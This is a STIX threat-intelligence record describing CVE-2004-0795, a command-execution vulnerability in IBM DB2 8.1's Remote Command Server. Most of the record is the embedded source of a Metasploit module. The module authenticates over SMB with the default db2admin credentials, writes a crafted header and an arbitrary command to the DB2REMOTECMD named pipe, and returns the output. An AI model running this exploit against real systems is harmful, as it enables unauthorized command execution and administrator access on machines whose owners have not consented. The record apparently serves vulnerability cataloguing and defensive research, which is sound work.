{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--25d1e18e-abae-4e3f-a9b3-358352a25dbe",
    "created": "2024-08-14T16:22:58.652833Z",
    "modified": "2024-08-14T16:22:58.652837Z",
    "name": "IBM DB2 db2rcmd.exe Command Execution Vulnerability",
    "description": " This module exploits a vulnerability in the Remote Command Server component in IBM's DB2 Universal Database 8.1. An authenticated attacker can send arbitrary commands to the DB2REMOTECMD named pipe which could lead to administrator privileges. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/db2/db2rcmd.rb",
            "external_id": "db2rcmd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0795"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM DB2 db2rcmd.exe Command Execution Vulnerability',\n      'Description'    => %q{\n          This module exploits a vulnerability in the Remote Command Server\n          component in IBM's DB2 Universal Database 8.1. An authenticated\n          attacker can send arbitrary commands to the DB2REMOTECMD named pipe\n          which could lead to administrator privileges.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-0795' ],\n          [ 'OSVDB', '4180' ],\n          [ 'BID', '9821' ],\n        ],\n      'DisclosureDate' => '2004-03-04'))\n\n      register_options(\n        [\n          OptString.new('CMD', [ true, 'The command to execute', 'ver']),\n          OptString.new('SMBUser', [ true, 'The username to authenticate as', 'db2admin'], fallbacks: ['USERNAME']),\n          OptString.new('SMBPass', [ true, 'The password for the specified username', 'db2admin'], fallbacks: ['PASSWORD']),\n        ])\n\n      deregister_options('SMB::ProtocolVersion')\n  end\n\n  def run\n\n    print_status(\"Connecting to the server...\")\n    connect(versions: [1])\n\n    print_status(\"Authenticating as user '#{datastore['SMBUser']}' with pass '#{datastore['SMBPass']}'...\")\n\n    # Connect with a valid user/pass. if not, then bail.\n    begin\n      smb_login()\n    rescue ::Exception => e\n      print_error(\"Error: #{e}\")\n      disconnect\n      return\n    end\n\n    # Have it so our command arg is convenient to call.\n    rcmd = datastore['CMD']\n\n    print_status(\"Connecting to named pipe \\\\DB2REMOTECMD...\")\n\n    # If the pipe doesn't exist, bail.\n    begin\n      pipe = simple.create_pipe('\\\\DB2REMOTECMD')\n    rescue ::Exception => e\n      print_error(\"Error: #{e}\")\n      disconnect\n      return\n    end\n\n    # If we get this far, do the dance.\n\n    fid = pipe.file_id\n\n    # Need to make a Trans2 request with the param of 'QUERY_FILE_INFO' keeping our file_id\n    trans2 = simple.client.trans2(0x0007, [fid, 1005].pack('vv'), '')\n\n    # Write to the pipe, our command length comes into play.\n    pipe.write([0x00000001].pack('V') + \"DB2\" + \"\\x00\" * 525 + [rcmd.length].pack('V'))\n    # Send off our command\n    pipe.write(rcmd)\n\n    # Read from the pipe and give us the data.\n    res = pipe.read()\n    print_line(res)\n\n    # Close the named pipe and disconnect from the socket.\n    pipe.close\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-03-04"
}